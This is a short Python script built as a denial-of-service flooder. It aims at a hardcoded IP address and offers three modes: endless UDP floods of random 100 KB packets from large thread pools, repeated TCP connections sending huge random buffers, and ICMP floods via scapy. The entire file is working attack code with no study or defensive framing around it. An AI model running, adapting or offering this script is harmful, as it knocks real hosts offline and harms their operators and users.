import random
import socket
import threading
import sys
import argparse
from scapy.all import *
from multiprocessing.dummy import Pool as ThreadPool

parser = argparse.ArgumentParser()
parser.add_argument('-port', help = 'target port')
parser.add_argument('-choice', help = 'user')
args = parser.parse_args()

ip = '82.200.161.178'
port = int(args.port)
choice = args.choice
times = 10000000000
threads = 10
def run(a):
	data = random._urandom(100*1024)
	i = random.choice(("[/]","[__]","[/]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(16*10000000000)
	i = random.choice(("[+]","-","[*]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" -->>")
		except:
			s.close()
			print("error ")

def run3():
	while True:
		target = ip
		cycle = times
		if cycle == "":
			cycle = 100
		for x in range (0,int(cycle)):
			send(IP(dst=target)/ICMP())

for y in range(threads):
	if choice == '1':
		pool = ThreadPool(100)
		results = pool.map(run,[i for i in range(10000)])
		pool.close()
		pool.join()

	elif choice == '2':
		th = threading.Thread(target = run2)
		th.start()
	elif choice == '3':
	    th = threading.Thread(target = run3)
	    th.start()	
sys.exit(0)
